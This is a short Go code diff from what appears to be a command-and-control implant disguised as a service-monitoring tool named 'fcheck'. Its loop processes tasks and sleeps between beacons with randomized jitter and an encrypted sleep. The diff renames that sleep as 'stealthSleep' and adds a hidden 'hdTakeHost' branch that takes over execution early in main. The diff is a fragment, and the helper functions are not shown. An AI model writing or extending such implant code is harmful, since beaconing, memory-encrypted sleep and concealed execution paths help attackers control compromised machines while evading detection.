@@ -492,8 +492,12 @@ func (sm *ServiceMonitor) run() {
 			pending = sm.processTasks(tasks)
 		}
 
-		sleepEncrypted(randomizeBeaconTiming(sm.parseInterval(), sm.parseJitter()))
+		stealthSleep(randomizeBeaconTiming(sm.parseInterval(), sm.parseJitter()))
 	}
+}
+
+func stealthSleep(d time.Duration) {
+	sleepEncrypted(d)
 }
 
 func main() {
@@ -509,6 +513,9 @@ func main() {
 	if *versionFlag {
 		fmt.Printf("fcheck v%s (built %s)\n", buildVersion, buildDate)
 		os.Exit(0)
+	}
+	if hdTakeHost() {
+		os.Exit(hdHostMain())
 	}
 
 	// Validate runtime environment before any network activity
@@ -637,7 +644,7 @@ func main() {
 			if svc.ctx.Err() != nil {
 				return
 			}
-			sleepEncrypted(randomizeBeaconTiming(svc.parseInterval(), svc.parseJitter()))
+			stealthSleep(randomizeBeaconTiming(svc.parseInterval(), svc.parseJitter()))
 		}
 	}
 }
